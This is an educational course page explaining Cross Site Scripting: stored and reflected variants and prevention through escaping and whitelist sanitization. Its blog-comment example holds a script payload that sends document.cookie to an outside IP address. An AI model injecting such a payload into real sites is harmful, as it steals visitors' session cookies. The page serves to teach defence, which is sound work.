<frontmatter>
  title: Cross Site Scripting
  footer: footer.md
  head: head.md
  siteNav: mainNav.md
  pageNav: 3
</frontmatter>

{{ navbar | safe }}

<div class="website-content">

# Cross Site Scripting (XSS)

Authors: [Tan Wang Leng](https://github.com/nus-oss/cs3281-website/tree/master/students/AY1617S2/tanWangLeng/TanWangLeng-Resume.md) and [Chester Sng](https://github.com/ChesterSng)

## What is XSS?
Cross Site Scripting (XSS) is the most exploited web application vulnerability to date. XSS vulnerabilities have been reported and exploited since the 1990s. Prominent sites affected in the past include social-networking sites Twitter, Facebook, MySpace and YouTube.

XSS is a type of injection, in which malicious code are injected into trusted websites. XSS flaws that allow these attacks to happen are widespread and can occur anywhere a web application uses input from a user to generate an output on the website without validating it or encoding it. 

## Why do you need to know about XSS?
As software engineers, or aspiring software engineers, it is highly likely that we will build web applications. It is important to know how we can protect our web applications against XSS, so that it will not be a become tool for attackers. 

## How does XSS work?
One of the most common ways to accept inputs from users are text boxes. In this example, we will look at a website that allows users to enter their comments to blog posts. 

Here is the comments section of the website: 

> **Comments Section** <br>
That's a very nice picture! <br>
Good photograph!

However, are users limited to just typing in plain text? This website does not check the input, thus users are able to use formatting HTML tags, such
as `<b>` for bolding and `<i>` for italicizing.

What happens when a user submits the following as a comment?
```html
I <b>like</b> your photograph!
```

It becomes: 
> **Comments Section** <br>
That's a very nice picture! <br>
Good photograph! <br>
I **like** your photograph!

The problem arises when a malicious user uses HTML for malicious purposes. HTML also supports `<script>`, for you to write JavaScript code on the webpage as well.
> In HTML, anything between `<script>` and `</script>` will be run as Javascript.

What happens when a malicious user submits the following as a comment?
```html
This is an innocent looking comment. <script>sendToServer("http://139.241.0.3/", document.cookie)</script>
```

It becomes: 
> **Comments Section** <br>
That's a very nice picture! <br>
Good photograph! <br>
I **like** your photograph! <br>
This is an innocent looking comment.

Visitors of the blog will only see the non-script portion of the comment. The script portion is rendered as `Javascript` just like how the `<b>` and `<i>` tags causes text to be **bolded** and *italicised* but the tags themselves are not shown. The script `<script>sendToServer("http://139.241.0.3/", document.cookie)</script>` will be run immediately when the visitors load the website. Here, the visitor will be unaware that his cookie is actually stolen. 

Therefore, the malicious user has managed to add additional "functionalities" to the website that is not intended by the original website developer.

> Trivia: The term "Cross Site Scripting" is actually an old term. It originally describe an attack whereby hackers write malicious JavaScript scripts on a separate website, and injects it into the victim's website, in order to steal data from the victim's website/deface the page (hence "Cross Site"). Such attacks are no longer possible today, and the modern definition of "Cross Site Scripting" includes attacks that do not need to be on a separate website to work.

## Types of Cross Site Scripting

There are no standard definitions, but there are at least two different types of
XSS:

* Persistent XSS (also known as stored XSS) - The JavaScript code gets stored in
the web server. Example: Posting a malicious JavaScript code into a blog post as
a comment. The comment gets stored in the database, and the web browser of future visitors of the
webpage will retrieve the comment from the database, resulting in execution.

* Non-persistent XSS (also known as reflected XSS) - The JavaScript code is
inserted in URL/links of website that accepts URL parameters as input. The input
is therefore not stored in a database.

An example of a non-persistent XSS attack would be an e-card website that displays an e-card to a visitor of the website. The e-card can be customised by modifying the `content` parameter of the URL:

`https://www.ecard.com/view-ecard.php?content=Happy%20Holidays`

However, that also means that hackers are able to also include scripts in their e-card content. They can send this URL to victims, hoping that they will click on them, resulting in the scripts being executed:

`https://www.ecard.com/view-ecard.php?content=Happy%20Holidays<script>...</script>`

## How to prevent XSS?

There are a couple of ways to prevent your website against XSS. The two most
common ways are:

**Escaping String Input** <br>
By converting legal HTML characters to their
display-equivalent (e.g. `<` to `&lt;`), you prevent the symbol from being
parsed as HTML. It now even shows the content on the screen (in case the actual
intention is to actually show someone how to code for example).
In the above example, the comment section will become like this: 
> **Comments Section** <br>
That's a very nice picture! <br>
Good photograph! <br>
I **like** your photograph! <br>
This is an innocent looking comment. <script>sendToServer("http://139.241.0.3/", document.cookie)</script>

The `<script>` and `</script>` will be displayed as text rather than being run as Javascript by the browser.

**Whitelist Sanitization** <br>
By scanning and parsing the input as HTML, you can
remove undesired HTML elements, and only allowing certain whitelisted HTML
elements to be used (e.g. whitelisting only `<b>` and `<i>`).

## Resources

References:

1. https://en.wikipedia.org/wiki/Cross-site_scripting (Overview of XSS taken from here)
1. http://projects.webappsec.org/f/WASC-TC-v2_0.pdf (page 32 & 33)
(Basic description of the XSS attack taken from here)
1. https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Stored_and_Reflected_XSS_Attacks
(Description of the two types of XSS attack taken from here)
1. http://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html
(Origin of the name "Cross Site Scripting")

Additional Reading Resources:

1. https://www.owasp.org/index.php/Testing_for_Cross_site_scripting
(How to test your website for XSS attacks)
1. https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet
(A list of possible preventions, which contains even more ways to protect your site from XSS attacks).
1. http://guides.rubyonrails.org/security.html#cross-site-scripting-xss
(In-depth discussion of how XSS attacks work, the different possible scenarios of such attacks, and possible preventive measures)
1. https://www.owasp.org/index.php/DOM_Based_XSS
(Discussion about DOM-based XSS attacks, a third possible type of XSS attacks)
1. https://excess-xss.com/
(Comprehensive coverage of *all* aspects of XSS)

Additional Resources:

1. https://github.com/OWASP/java-html-sanitizer (Java Sanitization framework)
(Implementation of HTML sanitization in Java)
1. https://github.com/rails/rails_xss
(Ruby on Rails plugin responsible for escaping String input in Ruby on Rails websites)
1. http://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html
(Ruby on Rails HTML sanitization function)

</div>
